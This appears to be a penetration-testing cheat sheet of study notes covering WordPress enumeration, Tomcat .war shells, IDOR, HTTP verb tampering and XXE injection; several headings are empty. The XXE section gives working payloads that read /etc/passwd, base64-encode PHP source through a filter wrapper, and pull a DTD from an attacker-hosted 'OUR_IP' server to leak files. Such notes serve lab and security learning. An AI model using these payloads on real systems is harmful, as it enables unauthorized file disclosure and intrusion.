## Wordpress

```
wpscan --url http://pressed.htb
```
```
wpscan --url http://pressed.htb --enumerate ap -v
```
## Web Proxies

### Burp


### Zap

## Tomcat
common attack is uploading a .war to get a shell. This can be done with default tomcat creds or finding admin creds.

## XSS

## Insecure Direct Object References(IDOR)

Identifying IDORs: Look for URL parameters or APIs with object references (e.g., ?uid=1 or ?filename=file_1.pdf). These references are often found in URL parameters, APIs, or other HTTP headers like cookies.

## XML External Entity (XXE) Injection
The first step in identifying potential XXE vulnerabilities is finding web pages that accept an XML user input. 

### Local File Disclosure example

```
<!DOCTYPE email [
  <!ENTITY new_ent SYSTEM "file:///etc/passwd">
]>
```
Define a new external entity

### PHP wrappers
some files may contain characters that will break the request. Can use a PHP wrapper to base64 encode

```
<!DOCTYPE email [
  <!ENTITY new_ent SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

### Error Based XXE

Create xxe.dtd file and host it
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

```
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

### RCE with XXE
If PHP expect module is enabled(not likley)

## HTTP Verb Tampering
A web server's authentication configuration may be limited to specific HTTP methods, which would leave some HTTP methods accessible without authentication. Exploiting HTTP Verb Tampering vulnerabilities is usually a relatively straightforward process. We just need to try alternate HTTP methods to see how they are handled by the web server and the web application. 

To show what options are available
```
curl -i -X OPTIONS http://SERVER_IP:PORT/
```
Can change request methods easily in burp by right clicking
